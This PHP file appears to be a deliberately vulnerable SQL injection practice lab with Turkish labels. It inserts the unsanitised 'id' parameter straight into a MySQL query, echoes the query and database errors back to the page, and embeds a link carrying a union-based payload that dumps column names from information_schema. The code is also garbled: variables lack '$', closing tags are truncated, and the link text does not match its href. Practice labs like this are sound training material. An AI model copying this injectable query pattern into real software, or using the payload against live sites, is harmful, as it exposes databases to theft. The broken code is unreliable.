<?php

	if(isset($_GET['id'])){
		$id = $_GET['id'];
	}else{
		die("ICERIK YOK");
	}
	include('db/config.php');
	$db = new mysqli($host,$username,$password,$database);
	if($db->connect_errno){
		die($db->connect_errno);
	}
	$sql = "select * from veri where id = '{$id}'";


?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>sqlinjection</title>
</head>
<body bgcolor="black">
	<center><img src="logo.png" alt="">
	<h2 style="color:White"> sqlinjection - String Based </h2>
	<div style="color:white">
	</h4>


		<?php if($veri = db->query(sql)):?>

			<?php while($icerik = $veri->fetch_object()): ?>

				<div style="color:white">
						<b style="color:red">Başlık:</b><italic> <?=$icerik->baslik;?> </italic>
					<hr />

						<div style="color:white">
							<b style="color:red">İçerik:</b><strong> <?=$icerik->icerik;?></strong>
						</div>
							<a href="http://localhost/lab/?id=-1%27%20union%20select%201,3%20from%20information_schema.columns%20where%20table_schema=database()--+">http://localhost/lab/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database()--+</a>
				</div>

			<?php endwhile;?>
		<?php else:
			echo $db->error;?
		<?php endif; ?
		<hr />
		<b style="color:red">Sql Sorgumuz: </b> <?php echo $sql; ?>

</div>


</div>
</div>
</body>
</html>
